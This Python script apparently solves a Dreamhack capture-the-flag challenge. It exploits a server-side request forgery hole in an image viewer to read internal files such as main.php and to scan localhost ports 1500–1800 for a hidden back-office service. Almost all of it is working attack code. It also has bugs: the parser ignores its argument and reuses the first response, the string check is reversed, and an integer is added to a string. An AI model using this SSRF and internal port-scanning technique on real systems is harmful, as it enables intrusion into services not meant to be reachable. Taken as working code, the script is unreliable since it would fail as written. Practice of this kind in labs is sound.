import requests , base64
addr="http://host3.dreamhack.games:12086/"+"img_viewer"
filename="static/dream.png"
filename="htdocs/index.html"
filename="main.php"
data={
    "url":f"http://localhost:8000/{filename}"
}

res=requests.post(url=addr,data=data)

resdata=res.text


def parfunc(intext):    
    pars='<img src="data:image/png;base64, '
    start=resdata.find(pars)+len(pars)
    # print(resdata[start:])
    end=resdata.find('"/>')
    ret=resdata[start:end]
    # print(ret)
    rdat=base64.urlsafe_b64decode(ret)
    # b64decode(ret)
    return rdat.decode('utf-8')
# print(resdata)
# rrrrr=parfunc(resdata)
# print(rrrrr.decode('utf-8'))


text="PHP Back Office"
for i in range(1500, 1800):
    # print(i)
    data={
        "url":f"http://127.0.0.1:{i}/{filename}"
    }
    res=requests.post(url=addr,data=data)
    
    if parfunc(res.text) in text:
        print(i+"열린 포트 번호")
        break

# if text in "PHP Back Office":
#     print(1)

